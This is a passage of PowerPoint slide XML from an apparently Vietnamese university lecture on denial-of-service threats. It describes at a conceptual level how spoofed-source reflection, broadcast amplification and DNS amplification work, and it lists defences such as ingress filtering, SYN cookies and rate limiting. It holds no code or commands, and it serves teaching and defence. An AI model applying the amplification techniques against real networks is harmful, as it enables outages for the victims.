              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Giả mạo địa chỉ nguồn là địa chỉ của mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Có thể tận dụng lợi thế của địa chỉ quảng bá của một số mạng (1 gói tin request chuyển tới địa chỉ broadcast </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> sinh ra nhiều gói tin response  flood response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Có )</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2964551949"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition/>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6F8C7B10-6DED-4E85-A2A4-C55C0B32A7CF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200"/>
              <a:t>Tấn công khuếch đại</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39939" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B60B08D8-01AE-4AFC-8AF6-CE425A11CDD9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1638300" y="1676400"/>
            <a:ext cx="8915400" cy="4800600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tấn công khuếch đại DNS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Sử dụng gói tin hướng vào một máy chủ DNS hợp pháp như hệ thống trung gian</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Kẻ tấn công tạo ra một loạt các yêu cầu DNS có chứa địa chỉ nguồn giả mạo của hệ thống mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Khai thác hành vi DNS để chuyển đổi một yêu cầu thành nhiều phản hồi lớn hơn (khuếch đại) (60 byte UDP request </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> 512/ 4000 (IPv6) byte UDP response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Mục tiêu bị tràn ngập những phản hồi này</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Biến thể khác: Khai thác các DNS server đệ quy (DNS protocol cho phép một DNS server truy vấn nhiều DNS server khác để phân giải một truy vấn DNS của client)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Bảo vệ cơ bản chống lại cuộc tấn công này là ngăn chặn việc sử dụng các địa chỉ nguồn giả mạo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2957786925"/>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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C05C84A0-ECEB-4136-9E4C-EE797166C3AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1215008" y="274638"/>
            <a:ext cx="9777536" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200"/>
              <a:t>Phòng thủ chống lại cuộc tấn công DDoS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E619B47-28AB-45DA-8AD4-2355E367BA09}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>phòng chống tấn công và đòn phủ đầu (trước khi tấn công)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>phát hiện tấn công và lọc (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="ＭＳ Ｐゴシック" pitchFamily="-1" charset="-128"/>
              </a:rPr>
              <a:t>trong cuộc tấn công)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="ＭＳ Ｐゴシック" pitchFamily="-1" charset="-128"/>
              </a:rPr>
              <a:t>truy vết nguồn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="ＭＳ Ｐゴシック" pitchFamily="-1" charset="-128"/>
              </a:rPr>
              <a:t>tấn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="ＭＳ Ｐゴシック" pitchFamily="-1" charset="-128"/>
              </a:rPr>
              <a:t>công và nhận dạng (trong </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="ＭＳ Ｐゴシック" pitchFamily="-1" charset="-128"/>
              </a:rPr>
              <a:t>và sau khi tấn công)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="ＭＳ Ｐゴシック" pitchFamily="-1" charset="-128"/>
              </a:rPr>
              <a:t>phản ứng tấn công (sau khi cuộc tấn công)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent6">
                  <a:lumMod val="50000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:ea typeface="ＭＳ Ｐゴシック" pitchFamily="-1" charset="-128"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2641412484"/>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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{85B869B4-7C2A-40E4-8C11-E9F45AEEC177}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200"/>
              <a:t>Phòng thủ chống lại cuộc tấn công DDoS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{784DA55F-9D43-469E-84E1-4A6490866411}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Chặn các địa chỉ nguồn giả mạo </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Trên router càng gần nguồn càng tốt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Bộ lọc có thể được sử dụng để </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>đảm bảo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>đường trở lại với địa chỉ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>nguồn là đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>ờng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>được sử dụng bởi các gói dữ liệu hiện tại</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Bộ lọc phải được áp dụng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>cho luồng mạng trước khi hoặc tại thời điểm nó </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>rời khỏi mạng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>của ISP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Sửa mã handling kết nối TCP sửa đổi</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>mã </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>hóa thông tin quan </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>trọng trong một cookie mà  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>được gửi như số thứ tự ban đầu của máy chủ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Client hợp lệ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>trả lời bằng một gói </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>ACK chứa số cookie tăng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>dần</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Drop một </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>mục </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>nhập cho </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>một kết nối </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>không hoàn thành từ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>bảng kết nối TCP khi nó tràn</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3196937065"/>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40140B69-26CD-49C5-9A2F-38F53BA1FA53}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1271464" y="332656"/>
            <a:ext cx="8915400" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phòng thủ chống lại cuộc tấn công DDoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46083" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D1B66042-CCE9-4B37-A102-95D55097F1D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1271464" y="2090928"/>
            <a:ext cx="8915400" cy="4800600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>kiểm soát tốc độ trong mạng phân phối upstream</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Phụ thuộc loại gói như ICMP, UDP, TCP / SYN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" i="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>áp đặt giới hạn</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Sử dụng handling xử lý kết nối TCP sửa đổi</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Server gửi SYN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" i="1"/>
              <a:t>cookies </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>khi bảng đầy (tái tạo lại dữ liệu bảng từ các tập tin cookie từ các client hợp lệ)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>chọn lọc hoặc drop ngẫu nhiên khi bảng đầy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="415650445"/>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90A931DE-0EF8-4370-A08C-E0778F0B562E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phòng thủ chống lại cuộc tấn công DDoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48131" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1F979657-3DF3-47E9-86D1-22DB35801ABF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1638300" y="1676400"/>
            <a:ext cx="8915400" cy="4800600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Chặn IP h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>ớng broadcasts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Chặn dịch vụ đáng ngờ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Quản lý các cuộc tấn công ứng dụng d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>ới dạng captcha để phân biệt yêu cầu con ng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>ời hợp lệ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Sử dụng máy chủ mirrored và replicated khi hiệu suất và độ tin cậy cao</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1799949987"/>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58F72CAA-8B13-4EB4-B040-C465CEA5322B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
